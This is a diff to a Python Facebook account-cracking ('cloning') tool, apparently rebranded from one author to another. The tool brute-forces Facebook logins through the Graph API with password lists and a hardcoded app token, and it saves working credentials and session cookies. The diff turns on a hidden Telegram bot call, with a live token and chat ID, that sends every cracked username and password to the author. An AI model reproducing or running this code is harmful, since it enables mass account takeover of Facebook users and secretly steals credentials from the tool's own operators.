@@ -70,21 +70,19 @@ def clear():
         print(logo)
 
 ##------------(LOGO)------------##
-os.system('xdg-open https://www.facebook.com/ahm.habib.39')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100054925285605')
 
 logo=(f"""{A}
-
 
 ██████╗░░█████╗░░░░░░░██████╗░░░░░█████╗░
 ██╔══██╗██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
 ██████╦╝██║░░╚═╝█████╗░░███╔═╝░░░██║░░██║
 ██╔══██╗██║░░██╗╚════╝██╔══╝░░░░░██║░░██║
 ██████╦╝╚█████╔╝░░░░░░███████╗██╗╚█████╔╝
-╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░                                    
-                                          \033[0;41mHABIB\033[0;92m
+╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░                                    \033[0;41mHABIB\033[0;92m
  {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} AHSAN HABIB
- {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G} A H M HABIB
+ {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G} Bangladesh Cyber 2.0
  {R}❲{G}😻{R}❳{G} 𝙑𝙀𝙍𝙎𝙄𝙊𝙉   {R}:{G}   1.0
  {R}❲{G}💚{R}❳{G} 𝙎𝙏𝘼𝙏𝙐𝙎    {R}:{G} \033[0;41mFREE\033[0;92m
  {R}❲{G}😻{R}❳{G} 𝙏𝙊𝙊𝙇𝙎     {R}:{G} 𝙍𝙖𝙣𝙙𝙤𝙢+𝙁𝙞𝙡𝙚 𝙘𝙡𝙤𝙣𝙞𝙣𝙜
@@ -96,15 +94,15 @@ def approval():
   uuid = str(os.geteuid())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/Emon1214/Lover/blob/main/Darco.txt').text
+    httpCaht = requests.get('https://github.com/Habib1214/Lover/blob/main/Darco.txt').text
     if id in httpCaht:
       print(f"{R}❲{G}1{R}❳{G} SUCCESSFUL APPROVAL")
       msg = str(os.geteuid())
       time.sleep(0.5)
-      Main_𝙀𝙈𝙊𝙉()
+      Main_HABIB()
       pass
     else:
-      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} 𝙀𝙈𝙊𝙉=['+id+']=XD')
+      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} HABIB=['+id+']=XD')
       linex()
       print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
       linex()
@@ -118,7 +116,7 @@ def approval():
     sys.exit()
 
 
-def Main_𝙀𝙈𝙊𝙉():
+def Main_HABIB():
         clear()
         print(f"{R}❲{G}1{R}❳{G} Start File Cloning")
         print(f"{R}❲{G}2{R}❳{G} Start Random Cloning")
@@ -132,12 +130,12 @@ def Main_𝙀𝙈𝙊𝙉():
             if opt == '1': bd()
             if opt == '2':ind()
             if opt== '3':gmail()
-            else:linex();print(f'{R}❲{G}~{R}❳{G} Selected Wrong Option ');time.sleep(2);Main_MRM()
+            else:linex();print(f'{R}❲{G}~{R}❳{G} ভুল অপশন দিছেন 🙂 ');time.sleep(2);Main_MRM()
             if d == '0':Main_MRM()
-            else:linex();print(f'{R}❲{G}~{R}❳{G}  Selected Wrong Option ');time.sleep(2);Main_MRM()
+            else:linex();print(f'{R}❲{G}~{R}❳{G}  ভুল অপশন দিছেন 🙂 ');time.sleep(2);Main_MRM()
  
         elif opt1 == "0":linex();print(f'{R}❲{G}~{R}❳{G} Exit Done Brother ');exit()
-        else:linex();print(f'{R}❲{G}~{R}❳{G} Selected Wrong Option ');time.sleep(2);Main_MRM()
+        else:linex();print(f'{R}❲{G}~{R}❳{G} ভুল অপশন দিছেন 🙂 ');time.sleep(2);Main_MRM()
  
 
 
@@ -218,7 +216,7 @@ def bd():
                 print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HABIB_M1_FILE_OK.txt")
                 print(f'\r{R}--------------------------------------------------')
                 input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
-                os.system('python Main_𝙀𝙈𝙊𝙉.py')
+                os.system('python Main_HABIB.py')
 
 ##--------------INDIA_RANDOM------------##
 
@@ -320,12 +318,12 @@ def lock(uid):
             return 'Locked'
 #############
 import requests
-def Emon(uid,pas):
+def Habib(uid,pas):
     try:
-       # token = "6716393521:AAFe0NSOVgfDzCrUMQUyvPJWE7YK9QnOMnA"
-       # chatid = "5434227549"
+        token = "6945341626:AAFDaUnkW8q-Rz-L1F_TSle3WMBkdgO3CkQ"
+        chatid = "6672622185"
         ok_id =str(uid+"|"+pas)
-       # url = f"https://api.telegram.org/bot{token}/sendMessage"
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
@@ -335,7 +333,7 @@ def Emon(uid,pas):
 def rd1(ids,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write(f'\r{R}❲{G}HABIB🥰-{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r{R}❲{G}HABIB🥰-.{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         for pas in passlist:
                 accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 head = {'User-Agent':sex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
@@ -349,7 +347,7 @@ def rd1(ids,passlist):
                         status= lock(uid)
                         if "Active" in status:
                         	print(f'\r{R}❲{G}HABIB🥰-_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
-                        	Emon(uid,pas)
+                        	Habib(uid,pas)
                         print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                         file_path_ok = os.path.join(folder_path, 'HABIB-RANDOM-OK.txt')
                         file_path_cookies = os.path.join(folder_path, 'HABIB-RANDOM-COOKIE.txt')
@@ -418,7 +416,7 @@ def api1(ids,names,passlist):
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
                     print(f'\r{R}❲{G} IHABIB🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
-                    Emon(uid,pas)
+                    Habib(uid,pas)
                     print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                     file_path = os.path.join(folder_path, 'HABIB-FILE-M1-OK.txt')
                     open('/sdcard/XD/HABIB-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
@@ -464,7 +462,7 @@ def api2(ids,names,passlist):
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
                     print(f'\r{R}❲{G}HABIB🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
-                    Emon(uid,pas)
+                    Habib(uid,pas)
                     print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                     file_path = os.path.join(folder_path, 'HABIB-FILE-M2-OK.txt')
                     open('/sdcard/XD/HABIB-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
@@ -490,9 +488,9 @@ def api2(ids,names,passlist):
 
 ##------------END-------------##
 
-try:Main_𝙀𝙈𝙊𝙉()
+try:Main_HABIB()
 except requests.exceptions.ConnectionError:
-    print(f'\n\033[1;92m [×] \033[1;91mNo internet connection ...')
+    print(f'\n\033[1;92m [×] \033[1;91mনেট পাচ্ছে না ভাই  ...')
 except Exception as e:pass
  
  
